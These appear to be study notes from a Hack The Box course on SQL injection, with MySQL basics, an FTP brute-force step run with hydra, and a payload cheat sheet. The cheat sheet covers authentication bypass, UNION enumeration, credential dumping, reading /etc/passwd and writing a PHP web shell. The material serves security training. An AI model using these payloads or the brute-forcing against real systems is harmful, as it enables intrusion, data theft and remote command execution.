
		(No info could be read for "-p": geteuid()=1000 but you should be root.)
		tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
		tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
		tcp6       0      0 :::80                   :::*                    LISTEN      -                  

	> Next, we can try brute forcing the FTP login for the m.gates user now.
	> Note 1: Sometimes administrators test their security measures and policies with different tools. In this case, the administrator of this web server kept "hydra" installed. We can benefit from it and use it against the local system by attacking the FTP service locally or remotely.
	> Note 2: "rockyou-10.txt" can be found in "/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt", which contains 92 passwords in total. This is a shorter version of "rockyou.txt" which includes 14,344,391 passwords.
	> So, similarly to how we attacked the SSH service, we can perform a similar attack on FTP:
		b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
	> We can now attempt to FTP as that user, or even switch to that user. Let us try both:
		b.gates@bruteforcing:~$ ftp 127.0.0.1
	> And to switch to that user:
		b.gates@bruteforcing:~$ su - m.gates


-=-=-=-=-=-=
[+] SQL Injection fundamentals

URLS ==> (https://www.sqlinjection.net/)

## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

* Intro to databases
	> Before we learn about SQL injections, we need to learn more about databases and Structured Query Language (SQL), which databases will perform the necessary queries. Web applications utilize back-end databases to store various content and information related to the web application. This can be core web application assets like images and files, content like posts and updates, or user data like usernames and passwords.
	> There are many different types of databases, each of which fits a particular type of use. Traditionally, an application used file-based databases, which was very slow with the increase in size. This led to the adoption of Database Management Systems (DBMS).

* Database Management Systems
	> A Database Management System (DBMS) helps create, define, host, and manage databases. Various kinds of DBMS were designed over time, such as file-based, Relational DBMS (RDBMS), NoSQL, Graph based, and Key/Value stores.
	> There are multiple ways to interact with a DBMS, such as command-line tools, graphical interfaces, or even APIs (Application Programming Interfaces). DBMS is used in various banking, finance, and education sectors to record large amounts of data. Some of the essential features of a DBMS include:
	Feature 	Description
	Concurrency 	A real-world application might have multiple users interacting with it simultaneously. A DBMS makes sure that these concurrent interactions succeed without corrupting or losing any data.
	Consistency 	With so many concurrent interactions, the DBMS needs to ensure that the data remains consistent and valid throughout the database.
	Security 	DBMS provides fine-grained security controls through user authentication and permissions. This will prevent unauthorized viewing or editing of sensitive data.
	Reliability 	It is easy to backup databases and rolls them back to a previous state in case of data loss or a breach.
	Structured Query Language 	SQL simplifies user interaction with the database with an intuitive syntax supporting various operations.

* Architecture
	> The diagram below details a two-tiered architecture => (https://academy.hackthebox.com/storage/modules/33/db_2.png)
	> Tier I usually consists of client-side applications such as websites or GUI programs. These applications consist of high-level interactions such as user login or commenting. The data from these interactions is passed to Tier II through API calls or other requests.
	> The second tier is the middleware, which interprets these events and puts them in a form required by the DBMS. Finally, the application layer uses specific libraries and drivers based on the type of DBMS to interact with them. The DBMS receives queries from the second tier and performs the requested operations. These operations could include insertion, retrieval, deletion, or updating of data. After processing, the DBMS returns any requested data or error codes in the event of invalid queries.
	> It is possible to host the application server as well as the DBMS on the same host. However, databases with large amounts of data supporting many users are typically hosted separately to improve performance and scalability.

[+] Types of Databases
	> Databases, in general, are categorized into Relational Databases and Non-Relational Databases. Only Relational Databases utilize SQL, while Non-Relational databases utilize a variety of methods for communications.

* Relational Databases
	> A relational database is the most common type of database. It uses a schema, a template, to dictate the data structure stored in the database. For example, we can imagine a company that sells products to its customers having some form of stored knowledge about where those products go, to whom, and in what quantity. However, this is often done in the back-end and without obvious informing in the front-end. Different types of relational databases can be used for each approach. For example, the first table can store and display basic customer information, the second the number of products sold and their cost, and the third table to enumerate who bought those products and with what payment data.
	> Tables in a relational database are associated with keys that provide a quick database summary or access to the specific row or column when specific data needs to be reviewed. These tables, also called entities, are all related to each other. For example, the customer information table can provide each customer with a specific ID that can indicate everything we need to know about that customer, such as an address, name, and contact information. Also, the product description table can assign a specific ID to each product. The table that stores all orders would only need to record these IDs and their quantity. Any change in these tables will affect all of them but predictably and systematically.
	> However, when processing an integrated database, a concept is required to link one table to another using its key, called a relational database management system (RDBMS). Many companies that initially use different concepts are switching to the RDBMS concept because this concept is easy to learn, use and understand. Initially, this concept was used only by large companies. However, many types of databases now implement the RDBMS concept, such as Microsoft Access, MySQL, SQL Server, Oracle, PostgreSQL, and many others.
	> For example, we can have a users table in a relational database containing columns like id, username, first_name, last_name, and others. The id can be used as the table key. Another table, posts, may contain posts made by all users, with columns like id, user_id, date, content, and so on.
	> HTML Example => (https://academy.hackthebox.com/storage/modules/75/web_apps_relational_db.jpg)
	> We can link the id from the users table to the user_id in the posts table to retrieve the user details for each post without storing all user details with each post. A table can have more than one key, as another column can be used as a key to link with another table. So, for example, the id column can be used as a key to link the posts table to another table containing comments, each of which belongs to a particular post, and so on.
	> The relationship between tables within a database is called a Schema.
	> This way, by using relational databases, it becomes rapid and easy to retrieve all data about a particular element from all databases. So, for example, we can retrieve all details linked to a specific user from all tables with a single query. This makes relational databases very fast and reliable for big datasets with clear structure and design and efficient data management. The most common example of relational databases is MySQL, which we will be covering in this module.

* Non-relational Databases
	> A non-relational database (also called a NoSQL database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored. Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. Therefore, when dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing such data. There are four common storage models for NoSQL databases:
    		- Key-Value
    		- Document-Based
    		- Wide-Column
    		- Graph

	> Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and have a key for each pair, and stores all of its data as its value: HTML Example
	> The above example can be represented using JSON as:

		{
		  "100001": {
		    "date": "01-01-2021",
		    "content": "Welcome to this web application."
		  },
		  "100002": {
		    "date": "02-01-2021",
		    "content": "This is the first post on this web app."
		  },
		  "100003": {
		    "date": "02-01-2021",
		    "content": "Reminder: Tomorrow is the ..."
		  }
		}

	> It looks similar to a dictionary item in languages like Python or PHP (i.e. {'key':'value'}), where the key is usually a string, and the value can be a string, dictionary, or any class object.
	> The most common example of a NoSQL database is MongoDB.
	> Non-relational Databases have a different method for injection, known as NoSQL injections. SQL injections are completely different than NoSQL injections. NoSQL injections will be covered in a later module.

[+] Intro to MySQL
	> This module introduces SQL injection through MySQL, and it is crucial to learn more about MySQL and SQL to understand how SQL injections work and utilize them properly. Therefore, this section will cover some of MySQL/SQL's basics and syntax and examples used within MySQL/MariaDB databases.

* Structured Query Language (SQL)
	> SQL syntax can differ from one RDBMS to another. However, they are all required to follow the ISO standard for Structured Query Language. We will be following the MySQL/MariaDB syntax for the examples shown. SQL can be used to perform the following actions:
    		- Retrieve data
    		- Update data
    		- Delete data
    		- Create new tables and databases
    		- Add / remove users
    		- Assign permissions to these users
* Command Line
	> The mysql utility is used to authenticate to and interact with a MySQL/MariaDB database. The -u flag is used to supply the username and the -p flag for the password. The -p flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.
		m1l0js@htb[/htb]$ mysql -u root -p
	> Again, it is also possible to use the password directly in the command, though this should be avoided, as it could lead to the password being kept in logs and terminal history:
		m1l0js@htb[/htb]$ mysql -u root -p<password>
	> Tip: There shouldn't be any spaces between '-p' and the password.
	> The examples above log us in as the superuser, i.e.,"root" with the password "password," to have privileges to execute all commands. Other DBMS users would have certain privileges to which statements they can execute. We can view which privileges we have using the SHOW GRANTS command be discussed later.
	> When we do not specify a host, it will default to the localhost server. We can specify a remote host and port using the -h and -P flags.
		m1l0js@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p 
	> Note: The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.
	> Note: To follow along with the examples, try to use the 'mysql' tool on your PwnBox to log in to the DBMS found in the question at the end of the section, using its IP and port. Use 'root' for the username and 'password' for the password.

* Creating a database
	> Once we log in to the database using the mysql utility, we can start using SQL queries to interact with the DBMS. For example, a new database can be created within the MySQL DBMS using the CREATE DATABASE statement.
		mysql> CREATE DATABASE users;
	> MySQL expects command-line queries to be terminated with a semi-colon. The example above created a new database named users. We can view the list of databases with SHOW DATABASES, and we can switch to the users database with the USE statement:
		mysql> SHOW DATABASES;
		mysql> USE users;
	> SQL statements aren't case sensitive, which means 'USE users;' and 'use users;' refer to the same command. However, the database name is case sensitive, so we cannot do 'USE USERS;' instead of 'USE users;'. So, it is a good practice to specify statements in uppercase to avoid confusion.

* Tables
	> DBMS stores data in the form of tables. A table is made up of horizontal rows and vertical columns. The intersection of a row and a column is called a cell. Every table is created with a fixed set of columns, where each column is of a particular data type.
	> A data type defines what kind of value is to be held by a column. Common examples are numbers, strings, date, time, and binary data. There could be data types specific to DBMS as well. A complete list of data types in MySQL can be found here(https://dev.mysql.com/doc/refman/8.0/en/data-types.html). For example, let us create a table named logins to store user data, using the CREATE TABLE SQL query:
	> As we can see, the CREATE TABLE query first specifies the table name, and then (within parentheses) we specify each column by its name and its data type, all being comma separated. After the name and type, we can specify specific properties, as will be discussed later.
		mysql> CREATE TABLE logins (
		    ->     id INT,
		    ->     username VARCHAR(100),
		    ->     password VARCHAR(100),
		    ->     date_of_joining DATETIME
		    ->     );

	> The SQL queries above create a table named logins with four columns. The first column, id is an integer. The following two columns, username and password are set to strings of 100 characters each. Any input longer than this will result in an error. The date_of_joining column of type DATETIME stores the date when an entry was added.
		mysql> SHOW TABLES;
	> A list of tables in the current database can be obtained using the SHOW TABLES statement. In addition, the DESCRIBE keyword is used to list the table structure with its fields and data types.
		mysql> DESCRIBE logins;

* Table Properties
	> Within the CREATE TABLE query, there are many properties(https://dev.mysql.com/doc/refman/8.0/en/create-table.html) that can be set for the table and each column. For example, we can set the id column to auto-increment using the AUTO_INCREMENT keyword, which automatically increments the id by one every time a new item is added to the table:
		id INT NOT NULL AUTO_INCREMENT,
	> The NOT NULL constraint ensures that a particular column is never left empty 'i.e., required field.' We can also use the UNIQUE constraint to ensures that the inserted item are always unique. For example, if we use it with the username column, we can ensure that no two users will have the same username:
    		username VARCHAR(100) UNIQUE NOT NULL,
	> Another important keyword is the DEFAULT keyword, which is used to specify the default value. For example, within the date_of_joining column, we can set the default value to Now(), which in MySQL returns the current date and time:
    		date_of_joining DATETIME DEFAULT NOW(),
	> Finally, one of the most important properties is PRIMARY KEY, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases, as previously discussed in the previous section. We can make the id column the PRIMARY KEY for this table:
    		PRIMARY KEY (id)

	> The final CREATE TABLE query will be as follows:
		CREATE TABLE logins (

		    id INT NOT NULL AUTO_INCREMENT,
		    username VARCHAR(100) UNIQUE NOT NULL,
		    password VARCHAR(100) NOT NULL,
		    date_of_joining DATETIME DEFAULT NOW(),
		    PRIMARY KEY (id)
		    );


[+] SQL Statements
	> Now that we understand how to use the mysql utility and create databases and tables, let us look at some of the essential SQL statements and their uses.

* INSERT Statement
	> The INSERT statement is used to add new records to a given table. The statement following the below syntax:
		INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
	> The syntax above requires the user to fill in values for all the columns present in the table.
		mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
	> The example above shows how to add a new login to the logins table, with appropriate values for each column. However, we can skip filling columns with default values, such as id and date_of_joining. This can be done by specifying the column names to insert values into a table selectively:
		INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
	> Note: skipping columns with the 'NOT NULL' constraint will result in an error, as it is a required value.
	> We can do the same to insert values into the logins table:
		mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
	> We inserted a username-password pair in the example above while skipping the id and date_of_joining columns.
	> Note: The examples insert cleartext passwords into the table, for demonstration only. This is a bad practice, as passwords should always be hashed/encrypted before storage.
	> We can also insert multiple records at once by separating them with a comma:
		mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
	> The query above inserted two new records at once.

* SELECT Statement
	> Now that we have inserted data into tables let us see how to retrieve data with the SELECT statement. This statement can also be used for many other purposes, which we will come across later. The general syntax to view the entire table is as follows:
		SELECT * FROM table_name;
	> The asterisk symbol (*) acts as a wildcard and selects all the columns. The FROM keyword is used to denote the table to select from. It is possible to view data present in specific columns as well:
		SELECT column1, column2 FROM table_name;
	> The query above will select data present in column1 and column2 only.
		mysql> SELECT * FROM logins;
		mysql> SELECT username,password FROM logins;
	> The first query in the example above looks at all records present in the logins table. We can see the four records which were entered before. The second query selects just the username and password columns while skipping the other two.

* DROP Statement
	> We can use DROP to remove tables and databases from the server.
		mysql> DROP TABLE logins;
		mysql> SHOW TABLES;
	> As we can see, the table was removed entirely.
	> The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.

* ALTER Statement
	> Finally, We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table. The below example adds a new column newColumn to the logins table using ADD:
		mysql> ALTER TABLE logins ADD newColumn INT;
	> To rename a column, we can use RENAME COLUMN:
		mysql> ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
	> We can also change a column's datatype with MODIFY:
		mysql> ALTER TABLE logins MODIFY oldColumn DATE;
	> Finally, we can drop a column using DROP:
		mysql> ALTER TABLE logins DROP oldColumn;
	> We can use any of the above statements with any existing table, as long as we have enough privileges to do so.

* UPDATE Statement
	> While ALTER is used to change a table's properties, the UPDATE statement can be used to update specific records within a table, based on certain conditions. Its general syntax is:
		UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
	> We specify the table name, each column and its new value, and the condition for updating records. Let us look at an example:
		mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
		mysql> SELECT * FROM logins;
	> The query above updated all passwords in all records where the id was more significant than 1.
	> Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next.


[+] Query Results
	> In this section, we will learn how to control the results output of any query.

* Sorting Results
	> We can sort the results of any query using ORDER BY and specifying the column to sort by:
		mysql> SELECT * FROM logins ORDER BY password;
	> By default, the sort is done in ascending order, but we can also sort the results by ASC or DESC:
		mysql> SELECT * FROM logins ORDER BY password DESC;
	> It is also possible to sort by multiple columns, to have a secondary sort for duplicate values in one column:
		mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;

* LIMIT results
	> In case our query returns a large number of records, we can LIMIT the results to what we want only, using LIMIT and the number of records we want:
		mysql> SELECT * FROM logins LIMIT 2;
	> If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count:
		mysql> SELECT * FROM logins LIMIT 1, 2;
	> Note: the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.

* WHERE Clause
	> To filter or search for specific data, we can use conditions with the SELECT statement using the WHERE clause, to fine-tune the results:
		SELECT * FROM table_name WHERE <condition>;
	> The query above will return all records which satisfy the given condition. Let us look at an example:
		mysql> SELECT * FROM logins WHERE id > 1;
	> The example above selects all records where the value of id is greater than 1. As we can see, the first row with its id as 1 was skipped from the output. We can do something similar for usernames:
		mysql> SELECT * FROM logins where username = 'admin';
	> The query above selects the record where the username is admin. We can use the UPDATE statement to update certain records that meet a specific condition.
	> Note: String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.

* LIKE Clause
	> Another useful SQL clause is LIKE, enabling selecting records by matching a certain pattern. The query below retrieves all records with usernames starting with admin:
		mysql> SELECT * FROM logins WHERE username LIKE 'admin%';
	> The % symbol acts as a wildcard and matches all characters after admin. It is used to match zero or more characters. Similarly, the _ symbol is used to match exactly one character. The below query matches all usernames with exactly three characters in them, which in this case was tom:
		mysql> SELECT * FROM logins WHERE username like '___';

[+] SQL Operators
	> Sometimes, expressions with a single condition are not enough to satisfy the user's requirement. For that, SQL supports Logical Operators to use multiple conditions at once. The most common logical operators are AND, OR, and NOT.

* AND Operator
	> The AND operator takes in two conditions and returns true or false based on their evaluation:
		condition1 AND condition2
	> The result of the AND operation is true if and only if both condition1 and condition2 evaluate to true:
		mysql> SELECT 1 = 1 AND 'test' = 'test';
		mysql> SELECT 1 = 1 AND 'test' = 'abc';
	> In MySQL terms, any non-zero value is considered true, and it usually returns the value 1 to signify true. 0 is considered false. As we can see in the example above, the first query returned true as both expressions were evaluated as true. However, the second query returned false as the second condition 'test' = 'abc' is false.

* OR Operator
	> The OR operator takes in two expressions as well, and returns true when at least one of them evaluates to true:
		mysql> SELECT 1 = 1 OR 'test' = 'abc';
		mysql> SELECT 1 = 2 OR 'test' = 'abc';
	> The queries above demonstrate how the OR operator works. The first query evaluated to true as the condition 1 = 1 is true. The second query has two false conditions, resulting in false output.

* NOT Operator
	> The NOT operator simply toggles a boolean value 'i.e. true is converted to false and vice versa':
		mysql> SELECT NOT 1 = 1;
		mysql> SELECT NOT 1 = 2;
	> As seen in the examples above, the first query resulted in false because it is the inverse of the evaluation of 1 = 1, which is true, so its inverse is false. On the other hand, the second was query returned true, as the inverse of 1 = 2 'which is false' is true.

* Symbol Operators
	> The AND, OR and NOT operators can also be represented as &&, || and !, respectively. The below are the same previous examples, by using the symbol operators:
		mysql> SELECT 1 = 1 && 'test' = 'abc';
		mysql> SELECT 1 = 1 || 'test' = 'abc';
		mysql> SELECT 1 != 1;

* Operators in queries
	> Let us look at how these operators can be used in queries. The following query lists all records where the username is NOT john:
		mysql> SELECT * FROM logins WHERE username != 'john';
	> The next query selects users who have their id greater than 1 AND username NOT equal to john:
		mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;

* Multiple Operator Precedence
	> SQL supports various other operations such as addition, division as well as bitwise operations. Thus, a query could have multiple expressions with multiple operations at once. The order of these operations is decided through operator precedence.
	> Here is a list of common operations and their precedence, as seen in the MariaDB Documentation(https://mariadb.com/kb/en/operator-precedence/):
    		- Division (/), Multiplication (*), and Modulus (%)
    		- Addition (+) and subtraction (-)
    		- Comparison (=, >, <, <=, >=, !=, LIKE)
    		- NOT (!)
    		- AND (&&)
    		- OR (||)
	> Operations at the top are evaluated before the ones at the bottom of the list. Let us look at an example:
		SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
	> The query has four operations: !=, AND, >, and -. From the operator precedence, we know that subtraction comes first, so it will first evaluate 3 - 2 to 1:
		SELECT * FROM logins WHERE username != 'tom' AND id > 1;
	> Next, we have two comparison operations, > and !=. Both of these are of the same precedence and will be evaluated together. So, it will return all records where username is not tom, and all records where the id is greater than 1, and then apply AND to return all records with both of these conditions:
		mysql> select * from logins where username != 'tom' AND id > 3 - 2;
	> We will see a few other scenarios of operator precedence in the upcoming sections.


[+] Intro to SQL Injections
	> Now that we have a general idea of how MySQL and SQL queries work let us learn about SQL injections.

* Use of SQL in Web Applications
	> First, let us see how web applications use databases MySQL, in this case, to store and retrieve data. Once a DBMS is installed and set up on the back-end server and is up and running, the web applications can start utilizing it to store and retrieve data.
	> For example, within a PHP web application, we can connect to our database, and start using the MySQL database through MySQL syntax, right within PHP, as follows:
		$conn = new mysqli("localhost", "root", "password", "users");
		$query = "select * from logins";
		$result = $conn->query($query);
	> Then, the query's output will be stored in $result, and we can print it to the page or use it in any other way. The below PHP code will print all returned results of the SQL query in new lines:
		while($row = $result->fetch_assoc() ){
			echo $row["name"]."<br>";
		}
	> Web applications also usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the databases:
		$searchInput =  $_POST['findUser'];
		$query = "select * from logins where username like '%$searchInput'";
		$result = $conn->query($query);
	> If we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.

* What is an Injection?
	> In the above example, we accept user input and pass it directly to the SQL query without sanitization.
	> Sanitization refers to the removal of any special characters in user-input, in order to break any injection attempts.
	> Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it. This can occur by escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is very likely to execute the injected code and run it.

* SQL Injection
	> An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. The previous example showed how user-input can be used within an SQL query, and it did not use any form of input sanitization:
		$searchInput =  $_POST['findUser'];
		$query = "select * from logins where username like '%$searchInput'";
		$result = $conn->query($query);
	> In typical cases, the searchInput would be inputted to complete the query, returning the expected outcome. Any input we type goes into the following SQL query:
		select * from logins where username like '%$searchInput'
	> So, if we input admin, it becomes '%admin'. In this case, if we write any SQL code, it would just be considered as a search term. For example, if we input SHOW DATABASES;, it would be executed as '%SHOW DATABASES;' The web application will search for usernames similar to SHOW DATABASES;. However, as there is no sanitization, in this case, we can add a single quote ('), which will end the user-input field, and after it, we can write actual SQL code. For example, if we search for 1'; DROP TABLE users;, the search input would be:
		'%1'; DROP TABLE users;'
	> Notice how we added a single quote (') after "1", in order to escape the bounds of the user-input in ('%$searchInput').
	> So, the final SQL query executed would be as follows:
		select * from logins where username like '%1'; DROP TABLE users;'
	> As we can see from the syntax highlighting, we can escape the original query's bounds and have our newly injected query execute as well. Once the query is run, the users table will get deleted.
	> Note: In the above example, for the sake of simplicity, we added another SQL query after a semi-colon (;). Though this is actually not possible with MySQL, it is possible with MSSQL and PostgreSQL. In the coming sections, we'll discuss the real methods of injecting SQL queries in MySQL.

* Syntax Errors
	> The previous example of SQL injection would return an error:
		Error: near line 1: near "'": syntax error
	> This is because of the last trailing character, where we have a single extra quote (') that is not closed, which causes a SQL syntax error when executed:
		select * from logins where username like '%1'; DROP TABLE users;'
	> In this case, we had only one trailing character, as our input from the search query was near the end of the SQL query. However, the user input usually goes in the middle of the SQL query, and the rest of the original SQL query comes after it.
	> To have a successful injection, we must ensure that the newly modified SQL query is still valid and does not have any syntax errors after our injection. In most cases, we would not have access to the source code to find the original SQL query and develop a proper SQL injection to make a valid SQL query. So, how would we be able to inject into the SQL query then successfully?
	> One answer is by using comments, and we will discuss this in a later section. Another is to make the query syntax work by passing in multiple single quotes, as we will discuss next (').
	> Now that we understand SQL injections' basics let us start learning some practical uses.

* Types of SQL Injections
	> SQL Injections are categorized based on how and where we retrieve their output. => (https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)
	> In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as In-band SQL injection, and it has two types: Union Based and Error Based.
		- With Union Based SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there. As for Error Based SQL injection, it is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.
	> In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as Blind SQL injection, and it also has two types: Boolean Based and Time Based.
		- With Boolean Based SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true. As for Time Based SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.
	> Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.
	> In this module, we will only be focusing on introducing SQL injections through learning about Union Based SQL injection.

[+] Subverting Query Logic
	> Now that we have a basic idea about how SQL statements work let us get started with SQL injection. Before we start executing entire SQL queries, we will first learn to modify the original query by injecting the OR operator and using SQL comments to subvert the original query's logic. A basic example of this is bypassing web authentication, which we will demonstrate in this section.

* Authentication Bypass
	> Consider the following administrator login page.
	> We can log in with the administrator credentials admin / p@ssw0rd. => (https://academy.hackthebox.com/storage/modules/33/admin_creds.png)
	> The page also displays the SQL query being executed to understand better how we will subvert the query logic. Our goal is to log in as the admin user without using the existing password. As we can see, the current SQL query being executed is:
		SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
	> The page takes in the credentials, then uses the AND operator to select records matching the given username and password. If the MySQL database returns matched records, the credentials are valid, so the PHP code would evaluate the login attempt condition as true. If the condition evaluates to true, the admin record is returned, and our login is validated. Let us see what happens when we enter incorrect credentials.
	> As expected, the login failed due to the wrong password leading to a false result from the AND operation.

* SQLi Discovery
	> Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:
		Payload 	URL Encoded
		' 		%27
		" 		%22
		# 		%23
		; 		%3B
		) 		%29
	> Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.
	> So, let us start by injecting a single quote:
	> We see that a SQL error was thrown instead of the Login Failed message. The page threw an error because the resulting query was:
		SELECT * FROM logins WHERE username=''' AND password = 'something';
	> As discussed in the previous section, the quote we entered resulted in an odd number of quotes, causing a syntax error. One option would be to comment out the rest of the query and write the remainder of the query as part of our injection to form a working query. Another option is to use an even number of quotes within our injected query, such that the final query would still work.

* OR Injection
	> We would need the query always to return true, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the OR operator in our SQL injection.
	> As previously discussed, the MySQL documentation for operation precedence(https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html) states that the AND operator would be evaluated before the OR operator. This means that if there is at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE since the OR operator returns TRUE if one of its operands is TRUE.
	> An example of a condition that will always return true is '1'='1'. However, to keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.
	> So, if we inject the below condition and have an OR operator between it and the original condition, it should always return true:
		admin' or '1'='1
	> The final query should be as follow:
		SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
	> This means the following:
    		- If username is admin
    		- OR
    		- If 1=1 return true 'which always returns true'
    		- AND
    		- If password is something
	> (https://academy.hackthebox.com/storage/modules/33/or_inject_diagram.png)
